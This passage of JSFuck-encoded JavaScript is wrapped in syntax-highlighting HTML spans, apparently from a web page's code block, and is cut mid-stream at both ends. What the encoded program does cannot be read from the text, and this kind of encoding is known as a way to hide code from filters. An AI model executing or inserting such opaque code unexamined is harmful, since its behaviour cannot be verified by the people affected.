class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>()<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span 